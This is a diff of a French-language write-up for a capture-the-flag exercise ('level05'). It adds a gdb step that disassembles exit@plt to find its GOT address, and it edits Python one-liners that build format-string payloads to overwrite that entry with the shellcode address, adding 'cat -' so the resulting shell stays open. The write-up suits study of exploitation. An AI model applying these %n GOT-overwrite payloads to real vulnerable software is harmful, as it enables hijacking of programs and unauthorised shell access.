@@ -82,9 +82,13 @@ gdb> x/100x $esp
 En cherchant la série de `0x90`, on trouve assez rapidement une adresse
 correctement alignée de notre shellcode.
 
+Pour trouver l'adress de la fonction exit. Il nous suffit de desasembler la fonction avant de lancer le binaire dans GDB.
+
 ```txt
-gdb> print &exit@got.plt
-0x80497e0
+(gdb) disass exit
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
+
 ```
 
 | Shellcode  | exit@got.plt |
@@ -157,8 +161,7 @@ L'idée est donc de remplacer:
 - `4` par l'adressed de notre shellcode.
 
 ```sh
-python -c "print '\xe0\x97\x04\x08%4294957240x%10\$n'") > input
-cat input | ./level05
+(python -c "print '\xe0\x97\x04\x08%4294957240x%10\$n'"; cat -) | ./level05
 ```
 
 On note que `%4294957240x` ajoute `4294957240` charactères à l'input, ce qui,
@@ -170,8 +173,7 @@ lorsqu'on lui donne notre adresse. On est donc contrain d'écrire notre valeur
 en deux fois.
 
 ```sh
-python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08%55488x%10\$n%10039x%11\$n'" > input
-cat input | ./level05
+(python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08%55488x%10\$n%10039x%11\$n'"; cat -) | ./level05
 ```
 
 Cette fois ci, on écrit à deux adresses différentes, qui correspondent au deux premiers
